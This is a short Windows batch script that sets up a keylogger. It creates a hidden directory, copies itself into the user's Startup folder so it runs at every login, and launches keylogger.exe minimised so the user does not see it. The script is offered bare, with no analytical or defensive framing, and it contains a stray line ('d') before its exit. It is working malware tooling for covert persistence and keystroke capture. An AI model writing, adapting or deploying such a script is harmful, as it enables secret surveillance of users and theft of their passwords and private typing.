@echo off

set "KEYLOGGER_PATH=%ALLUSERSPROFILE%\AppDataLocal\HiddenDir\keylogger.exe"
set "STARTUP_PATH=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\keylogger_starter.cmd"

mkdir "%ALLUSERSPROFILE%\AppDataLocal\HiddenDir" 2>nul
attrib +h "%ALLUSERSPROFILE%\AppDataLocal\HiddenDir" >nul


copy "%~f0" "%STARTUP_PATH%" >nul


start /min "" "%KEYLOGGER_PATH%"

d
exit